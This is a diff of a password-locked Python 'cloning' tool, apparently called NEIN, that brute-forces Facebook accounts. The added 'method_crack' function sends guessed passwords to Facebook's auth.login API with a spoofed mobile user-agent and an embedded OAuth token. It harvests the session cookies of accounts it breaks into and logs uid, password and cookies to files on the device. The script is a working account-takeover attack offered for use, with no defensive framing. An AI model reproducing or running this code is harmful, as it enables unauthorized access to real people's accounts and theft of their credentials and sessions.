@@ -1,6 +1,8 @@
 # Définir le numéro de version
 version_actuelle = "1.5"
 
+
+
 import os
 import random
 import string 
@@ -12,10 +14,13 @@ import requests
 import sys
 import secrets
 import getpass
+
 # Mot de passe pour déverrouiller le script
 mot_de_passe = "ITACHI2024"
+
 # Demander à l'utilisateur de saisir le mot de passe
 saisie_mot_de_passe = getpass.getpass("Veuillez entrer le mot de passe : ")
+
 # Vérifier si le mot de passe saisi est correct
 if saisie_mot_de_passe == mot_de_passe:
     print("Mot de passe correct. Exécution de git pull...")
@@ -26,6 +31,7 @@ if saisie_mot_de_passe == mot_de_passe:
         print(f"Erreur lors de l'exécution de git pull : {e}")
         exit(1)
     print("Git pull terminé avec succès !")
+
 #-------------color----------------#
 bblack="\033[1;30m"         # Black
 M="\033[1;31m"            # Red
@@ -47,6 +53,8 @@ line_colors = [bblack, M, H, byellow, bblue, P, C, B]
 word_colors = [B, C, P, H, M, byellow, bblue, P, C, B]
 #-------------logo-----------------#
 logo=(f'''{B}
+
+
                                  
 ,--.  ,--.,------.,--.,--.  ,--. 
 |  ,'.|  ||  .---'|  ||  ,'.|  | 
@@ -54,7 +62,9 @@ logo=(f'''{B}
 |  | `   ||  `---.|  ||  | `   | 
 `--'  `--'`------'`--'`--'  `--' 
                                  
+
                                             
+
 {warna}--------------------------------------------{B}
  Owner    : {M}CHRICE999{M}
  TOOL NAME : {warna}{P}NEIN{P}{warna}
@@ -115,3 +125,58 @@ def BD_CLONING():
     print(' TOTAL CP ID '+str(len(cps)))
     input(' PRESS ENTER TO BACK  : ')
     MR_ITACHI()
+#------------ method crack def ---------#
+def method_crack(ids, passlist):
+    global oks
+    global cps
+    global loop
+    try:
+        for pas in passlist:
+            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
+            sys.stdout.flush()
+            adid=str(uuid.uuid4())
+            device_id=str(uuid.uuid4())
+            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
+            header={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
+            url='https://api.facebook.com/method/auth.login'
+            reqx=requests.post(url,data=datax,headers=header).json()
+            if 'session_key' in reqx:
+                try:
+                    uid=reqx['uid']
+                except:
+                    uid=ids
+                if str(uid) in oks:
+                    break
+                else:
+                    print('\r\r \033[1;32m[ITACHI-OK] '+str(uid)+' | '+pas+'\033[1;37m')
+                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
+                    print('\033[1;32m [COOKIES] '+coki)
+                    # Vérifier si le dossier ITACHI-IDS existe et le créer si nécessaire
+                    if not os.path.exists("/sdcard/ITACHI-IDS"):
+                        os.makedirs("/sdcard/ITACHI-IDS")
+                    # Enregistrer dans le fichier ITACHI-OK.txt
+                    with open(os.path.join("/sdcard/ITACHI-IDS", "ITACHI-OK.txt"), 'a') as f:
+                        f.write(str(uid)+'|'+pas+'|'+coki+'\n')
+                    oks.append(str(uid))
+                    break
+            elif 'www.facebook.com' in reqx['error_msg']:
+                print('\r\r \033[1;30m[ITACHI-CP] '+ids+' | '+pas+'\033[1;37m')
+                # Enregistrer dans le fichier ITACHI-CP.txt
+                with open(os.path.join("/sdcard/ITACHI-IDS", "ITACHI-CP.txt"), 'a') as f:
+                    f.write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+#-------------end----------------#
+
+# Générateur de séquence aléatoire
+def generate_random_sequence(length):
+    sequence = [random.choice(string.digits) for _ in range(length)]
+    return sequence
+
+# Appel à la fonction MR_ITACHI pour démarrer le programme
+MR_ITACHI()
